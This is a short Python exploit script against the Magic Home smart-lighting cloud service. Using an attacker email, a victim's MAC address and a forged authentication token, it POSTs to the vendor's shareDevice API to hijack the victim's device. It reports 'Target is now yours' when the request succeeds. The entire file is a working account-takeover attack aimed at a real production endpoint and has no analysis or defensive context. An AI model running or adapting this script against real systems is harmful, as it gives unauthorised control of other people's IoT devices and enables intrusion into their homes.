#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re

def Usage():
    print (f"Usage: {sys.argv[0]} <attacker email> <target email> <target mac address> <target forged token>")

def Main():

    attacker_email = sys.argv[1]
    target_email = sys.argv[2]
    target_mac = sys.argv[3]
    forged_token = sys.argv[4]

    os.system('clear')
    print (Fore.WHITE + "[+] Sending Payload ...")
    url = "https://wifij01us.magichue.net/app/shareDevice/ZG001"

    array = {"friendUserID":attacker_email, "macAddress":target_mac}

    data = json.dumps(array)

    headers = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":forged_token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    
    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
        print (response.text)
        if "true" in response.text:
            print (Fore.GREEN + "[*] Target is now yours ... " + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to take over target !" + Style.RESET_ALL)
    else:
        print (Fore.RED + "[-] Failed to take over target !" + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        Usage()
    else:
        Main()
